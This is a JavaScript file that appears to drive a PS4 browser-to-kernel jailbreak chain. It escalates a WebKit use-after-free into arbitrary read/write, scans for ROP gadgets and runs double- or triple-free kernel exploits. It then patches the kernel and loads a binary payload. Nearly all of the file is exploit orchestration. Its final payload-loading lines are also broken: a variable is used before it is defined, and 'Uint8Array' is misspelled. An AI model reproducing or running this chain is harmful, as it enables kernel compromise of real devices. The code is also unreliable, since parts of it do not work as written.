function load_script(src, remote = true, transfer = []) {
  return new Promise((resolve, reject) => {
    const script = document.createElement("script");
    script.src = src;
    script.onload = resolve;
    script.onerror = reject;
    document.head.appendChild(script);
  });
}

async function doJb() {
  await load_script("src/misc.js");

  try {
    version.init();
    switch (version.console) {
      case 4:
        // Load scanner FIRST (runtime scanning functions)
        await load_script("src/ps4/scanner.js");
        // Load userland (init_rw, init_arw, init_rop, init_syscalls)
        await load_script("src/ps4/userland.js");
        break;
      case 5:
        //TODO
        break;
      default:
        logger.info("Unsupported console " + version.console);
    }

    logger.info("===USERLAND===");

    let rw = undefined;
    if (arw.master === undefined) {
      rw = await init_rw();
    }

    // Stage 1: Scan CSSFontFace struct offsets (needed by init_arw)
    // This uses the initial read/write primitive from the UAF
    const css_offsets = scanner.scan_css_fontface(rw);
    logger.info("CSSFontFace offsets scanned!");

    // Populate constants with dynamic CSSFontFace offsets
    // The rest of the code uses constants.wk_CSSFontFace_* as before
    constants.wk_CSSFontFace_vtable = css_offsets.vtable;
    constants.wk_CSSFontFace_sizeof = css_offsets.sizeof;
    constants.wk_CSSFontFace_m_status = css_offsets.m_status;
    constants.wk_CSSFontFace_m_thread = css_offsets.m_thread;
    constants.wk_CSSFontFace_m_clients = css_offsets.m_clients;
    constants.wk_CSSFontFace_m_wrapper = css_offsets.m_wrapper;
    constants.wk_CSSFontFace_m_families = css_offsets.m_families;

    if (css_offsets.featureSettings_buffer !== undefined) {
      constants.wk_CSSFontFace_m_featureSettings_m_buffer = css_offsets.featureSettings_buffer;
      constants.wk_CSSFontFace_m_featureSettings_m_size = css_offsets.featureSettings_size;
      constants.wk_CSSFontFace_m_featureSettings_m_capacity = css_offsets.featureSettings_capacity;
    }

    init_arw(rw);

    // Stage 2: Scan for imports and gadgets (needed by init_rop)
    const import_results = scanner.scan_imports(webkit_base);
    logger.info("WebKit imports scanned!");

    if (import_results.wk___imp_strerror) {
      constants.wk___imp_strerror = import_results.wk___imp_strerror;
    }
    if (import_results.wk___imp___error) {
      constants.wk___imp___error = import_results.wk___imp___error;
    }

    // Find library bases from imports
    const lib_results = scanner.find_library_bases(webkit_base, import_results);
    if (lib_results.c_strerror) {
      constants.c_strerror = lib_results.c_strerror;
    }
    if (lib_results.k__error) {
      constants.k__error = lib_results.k__error;
    }

    // Scan for gadgets
    const gadget_results = scanner.scan_gadgets(webkit_base);
    logger.info("ROP gadgets scanned!");

    // Populate the gadgets object with found values
    for (const [name, addr] of Object.entries(gadget_results)) {
      gadgets[name] = addr;
    }

    init_rop();
    init_syscalls();

    logger.info("===END===");

    await load_script("src/loader.js");
    await load_script("src/worker.js");
    await load_script("src/workers.js");

    switch (version.console) {
      case 4:
        await load_script("src/ps4/kernel.js");
        break;
      case 5:
        //TODO
        break;
      default:
        logger.info("Unsupported console " + version.console);
    }

    await load_script("src/" + exploitChain + ".js");

    // Stage 3: Kernel offsets are scanned inside the kernel exploit functions
    // The scanner functions (scan_kernel_sysent, etc.) are available when needed

    logger.info("===" + exploitChain.toUpperCase() + "===");

    try {
      if (exploitChain == "lapse") {
        init();
        await setup();
        await double_free_reqs2();
        leak_kaddrs();
        double_free_reqs1();
        make_karw();

        inc_karw_pipe_refcnt();

        logger.info("Corrupted context cleanup started...");

        remove_pktinfo_from_so(pktopts_twins[0]);
        remove_rthdr_from_so(pktopts_twins[1]);
        remove_rthdr_from_so(rthdr_twins[0]);

        logger.info("Corrupted context cleanup completed !!");
      } else {
        init();
        await setup();
        await ucred_triple_free();
        leak_kqueue();
        await make_karw();

        inc_karw_pipe_refcnt();

        logger.info("Corrupted context cleanup started...");

        for (let i = 0; i < triplets.length; i++) {
          remove_rthdr_from_so(triplets[i]);
        }
        remove_uaf_file();

        logger.info("Corrupted context cleanup completed !!");
      }
    } finally {
      cleanup();
    }

    find_all_proc();

    // Avoid reapplying if already done
    if (fn.setuid.invoke(0) === -1) {
      // Scan for kernel SYSENT_661 before jailbreak
      logger.info("Scanning for kernel offsets dynamically...");
      // The kernel offset scanning uses the scanner functions

      jailbreak();

      const kpatches_rsp = await fetch("src/ps4/patches/" + constants.KPATCH);
      const kpatches_buf = await kpatches_rsp.arrayBuffer();
      const kpatches_u8 = new Uint8Array(kpatches_buf);

      kernel_patches(kpatches_u8);

      const bin_rsp = await fetch("src/payload.bin");
      const bin_buf = await bin_buf.arrayBuffer();
      const bin_u8 = new Unt8Array(bin_buf);

      load_bin(bin_u8);
    }

    logger.info("===END===");
  } catch (e) {
    logger.error(e.message);
    logger.error(e.stack);
  }
}
